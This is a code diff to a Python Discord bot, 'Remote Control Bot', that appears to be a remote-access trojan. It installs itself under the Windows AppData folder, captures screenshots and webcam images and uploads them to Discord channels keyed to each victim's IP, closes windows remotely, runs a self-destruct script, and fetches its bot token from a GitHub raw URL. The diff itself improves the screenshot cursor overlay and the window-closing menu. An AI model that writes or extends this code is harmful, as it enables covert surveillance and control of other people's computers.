@@ -27,6 +27,7 @@ import webbrowser
 import requests
 import sys
 import win32gui, win32con
+from PIL import Image
 
 def get_open_windows():
     windows = {}
@@ -79,8 +80,16 @@ def get_device_ip():
     mac = hex(uuid.getnode()).replace('0x', '').upper()
     return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
 
+user_profile = os.environ['USERPROFILE']
+target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+os.makedirs(target_path, exist_ok=True)
 
 pyautogui.FAILSAFE = False
+
+path_to_cursor = os.path.join(target_path, 'skibidi-mainmain', 'cursor', 'cursor.png')
+cursor_image = Image.open(path_to_cursor)
+cursor_width, cursor_height = 16, 16
+
 
 
 client = commands.Bot(command_prefix = '!', intents=nextcord.Intents.default())
@@ -199,6 +208,11 @@ async def status(interaction : Interaction):
         user_id = interaction.user.id
         await interaction.response.send_message("Taking screenshot...")
         screenshot = pyautogui.screenshot()
+        x, y = pyautogui.position()
+        final_x = x - cursor_width // 2
+        final_y = y - cursor_height // 2
+        paste_position = (final_x, final_y)
+        screenshot.paste(cursor_image, paste_position, cursor_image)
         screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
         file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
         embed = nextcord.Embed(description="Status", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
@@ -231,7 +245,7 @@ async def take_picture(interaction : Interaction):
                 file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'captured_image.png'), filename='captured_image.png')
                 embed = nextcord.Embed(description="Image", title="Captured image:", timestamp=datetime.now(), colour=0xb400f5)
                 embed.set_author(name="Remote Control Bot")
-                embed.set_image(url=f"attachment://status.png")
+                embed.set_image(url=f"attachment://captured_image.png")
                 embed.set_footer(text="Remote Control Bot v1.3")
 
                 await interaction.send(embed=embed, file=file)
@@ -306,7 +320,7 @@ sys.exit(0)
     subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
     sys.exit(0)
     
-@client.slash_command(guild_ids=testServerId, description="Closes all windows on the client's computer")
+@client.slash_command(guild_ids=testServerId, description="Closes the window selected.")
 async def close_all_windows(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
@@ -327,34 +341,38 @@ async def close_all_windows(interaction : Interaction):
                 print(f"Could not close window {hwnd}: {e}")
 
 @client.slash_command(guild_ids=testServerId, description="Select a window to close on client's computer.")
-async def close_window_command(interaction: nextcord.Interaction):
+async def close_selected_window(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
         windows = get_open_windows()
 
         if not windows:
-            await interaction.response.send_message("No open windows found.", ephemeral=True)
+            await interaction.response.send_message(content="No open windows found.")
             return
 
         class WindowSelect(nextcord.ui.Select):
             def __init__(self):
                 options = [
-                    nextcord.SelectOption(label=title[:100], description=f"HWND: {hwnd}")
+                    nextcord.SelectOption(label=title[:100], value=str(hwnd))
                     for hwnd, title in windows.items()
                 ]
                 super().__init__(placeholder="Select a window to close", options=options)
 
-            async def callback(self, select_interaction: nextcord.Interaction):
-                selected_hwnd = int(self.values[0].split("HWND: ")[1])
+            async def callback(self, select_interaction: Interaction):
+                selected_hwnd = int(self.values[0])
                 close_window(selected_hwnd)
-                await select_interaction.response.send_message(f"Closed window: {windows[selected_hwnd]}", ephemeral=True)
+
+                await interaction.delete_original_message()
+                await select_interaction.response.send_message(
+                    content=f"Closed window: {windows[selected_hwnd]}"
+                )
 
         class WindowView(nextcord.ui.View):
             def __init__(self):
                 super().__init__()
                 self.add_item(WindowSelect())
 
-        await interaction.response.send_message("Select a window to close:", view=WindowView(), ephemeral=True)
+        await interaction.response.send_message("Select a window to close:", view=WindowView())
 
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
 token = r.text
